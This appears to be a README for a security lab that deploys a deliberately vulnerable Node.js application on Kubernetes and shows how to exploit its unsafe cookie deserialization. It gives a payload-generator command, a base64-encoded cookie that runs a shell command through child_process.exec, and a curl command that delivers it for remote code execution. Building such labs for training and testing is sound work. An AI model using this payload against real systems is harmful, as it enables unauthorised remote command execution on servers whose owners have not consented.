# Deploy a Vunerable nodejs Application

This example allows you to deploy a vulnerable Node.js application that allows remote command execution. The application does not sanitize inputs, and thus can be vulnerable to attacks against a JavaScript feature called Immediately Invoked Function Expressions. 

## Deploy the Application

To deploy the vulnerable application run:
```
$ kubectl create -f nodejs-app.yml
```

## node-exploit

This contains the vulnerable application and the Dockerfile used to create the container containing the application.

## nodejspayload.py

Use this to generate a payload that exploits the application. On a MacOS or Linux system run:

```
$ python nodejspayload.py "ls -l /" | base64
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTAxLDEyMCwxMDEsOTksNDAsMzksMTA4LDExNSwzMiw0NSwxMDgsMzIsNDcsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSwxMTQsMTE0LDExMSwxMTQsNDQsMzIsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDQsMzIsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDEsMzIsMTIzLDMyLDk5LDExMSwxMTAsMTE1LDExMSwxMDgsMTAxLDQ2LDEwOCwxMTEsMTAzLDQwLDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQxLDMyLDEyNSw0MSw1OSwxMCkpfSgpIn0=
```

Set a cookie with this data via curl and access the application. The output of the command that is ran will appear in the container's `stdout`.

```
curl --cookie "profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTAxLDEyMCwxMDEsOTksNDAsMzksMTA4LDExNSwzMiw0NSwxMDgsMzIsNDcsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSwxMTQsMTE0LDExMSwxMTQsNDQsMzIsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDQsMzIsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDEsMzIsMTIzLDMyLDk5LDExMSwxMTAsMTE1LDExMSwxMDgsMTAxLDQ2LDEwOCwxMTEsMTAzLDQwLDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQxLDMyLDEyNSw0MSw1OSwxMCkpfSgpIn0=" http://<nodeIp>:30080/
Hello World
```


```
